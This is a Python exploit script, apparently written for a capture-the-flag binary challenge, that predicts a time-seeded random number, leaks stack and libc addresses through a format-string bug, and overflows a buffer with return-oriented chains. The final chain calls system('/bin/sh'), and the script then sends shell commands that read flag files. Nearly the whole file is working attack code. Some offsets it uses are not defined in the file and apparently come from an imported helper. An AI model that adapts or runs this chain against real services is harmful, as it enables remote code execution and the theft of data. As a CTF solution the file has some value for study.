import time, re, struct, sys
from lib78 import *
from lib78 import ONE_WAY
from elfsym import ELF

LIBC_PATH = 'libc_cache/libc6_2.39-0ubuntu8.8_amd64.so'
CMDS = [b'echo PWNED_START\n', b'id\n', b'cat /flag*\n', b'cat /home/*/flag*\n', b'ls -la /\n']

_e = ELF(LIBC_PATH)
_syms = _e.symbols()
OFF_PUTS = _syms['puts']
OFF_SYSTEM = _syms['system']
OFF_MAIN_RET = 0x2a1ca
_d = open(LIBC_PATH, 'rb').read()
_binsh_off = _d.find(b'/bin/sh\x00')
# 文件偏移 -> 虚拟地址
_e_phoff = struct.unpack_from('<Q', _d, 0x20)[0]
_e_eps = struct.unpack_from('<H', _d, 0x36)[0]
_e_epn = struct.unpack_from('<H', _d, 0x38)[0]
OFF_BINSH = None
for _i in range(_e_epn):
    _o = _e_phoff + _i * _e_eps
    _t, _fl = struct.unpack_from('<II', _d, _o)
    _off, _va, _pa, _fs, _ms, _al = struct.unpack_from('<QQQQQQ', _d, _o + 8)
    if _t == 1 and _off <= _binsh_off < _off + _fs:
        OFF_BINSH = _va + (_binsh_off - _off)
        break
OFF_POP_RDI = 0x10c08d

print('offsets: puts=%#x system=%#x binsh=%#x main_ret=%#x pop_rdi=%#x'
      % (OFF_PUTS, OFF_SYSTEM, OFF_BINSH, OFF_MAIN_RET, OFF_POP_RDI))


def align_send(c, data, lo=0.06, hi=0.28):
    while True:
        t = time.time()
        if lo <= (t % 1) <= hi:
            c.send(data)
            return t
        time.sleep(0.006)


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)


def attempt(pad_rets=1, v=False):
    c = Conn()
    try:
        c.s.settimeout(3)
        buf = b''
        while buf.count(b'\n') < 2:
            d = c.s.recv(1)
            if not d:
                return None
            buf += d
        T = time.time()
        c.buf = b''
        c.send(str(GlibcRand(int(T - ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('说出你想要说的话吧'.encode())
        if not ok:
            return None
        t1 = align_send(c, b'%15$p.%17$p\n')
        out, ok = c.read_until('如果只是许愿'.encode())
        m = re.findall(rb'0x[0-9a-f]+', out)
        if len(m) < 2:
            return None
        base = int(m[0], 16) - OFF_RET_MAIN
        libc_ret = int(m[1], 16)
        c.read_until('做你想要做的事吧'.encode())
        c.send(str(GlibcRand(int(t1 + ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('做你想要做的事吧'.encode())
        if not ok:
            return None

        chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + 0x1428]
        c.send(b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain1))
        time.sleep(0.2)
        c.send(fmt_addr('%6$s', base + OFF_PUTS_GOT))
        time.sleep(0.7); c.pull(0.6)
        raw = c.buf
        off = 2 if raw[:2] == b':\n' else 0
        if len(raw) < off + 6:
            return None
        puts_addr = int.from_bytes(raw[off:off + 6], 'little')
        c.buf = raw[off + 6:]
        if not (0x700000000000 < puts_addr < 0x800000000000):
            return None

        libc_base = libc_ret - OFF_MAIN_RET
        if libc_base + OFF_PUTS != puts_addr:
            if v:
                print('  [x] libc 不匹配: expect puts %#x got %#x' % (libc_base + OFF_PUTS, puts_addr))
            return None
        system = libc_base + OFF_SYSTEM
        binsh = libc_base + OFF_BINSH
        pop_rdi = libc_base + OFF_POP_RDI
        if v:
            print('  libc_base=%#x system=%#x binsh=%#x' % (libc_base, system, binsh))

        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        if not ok:
            return None
        c.send(b'1\n')
        time.sleep(0.6); c.pull(0.5); c.buf = b''

        chain = [base + OFF_RET] * pad_rets + [pop_rdi, binsh, system]
        payload = b'C' * 0x40 + p64(0) + b''.join(p64(x) for x in chain)
        c.send(payload)
        time.sleep(1.0); c.pull(0.6)
        if v:
            print('  rop tail:', c.buf[:30])
        c.buf = b''
        for cmd in CMDS:
            c.send(cmd)
            time.sleep(0.5)
        time.sleep(1.0); c.pull(1.5)
        return c.buf
    finally:
        c.close()


if __name__ == '__main__':
    for i in range(30):
        pr = (i % 3) + 1
        try:
            r = attempt(pad_rets=pr, v=True)
        except Exception as e:
            continue
        txt = (r or b'').decode('utf-8', 'replace')
        print('try %d (rets=%d): %s' % (i, pr, txt[:200].replace('\n', ' | ')))
        if 'HTUCTF' in txt or 'flag{' in txt:
            open('flag.txt', 'w').write(txt)
            print('*** FLAG ***')
            break
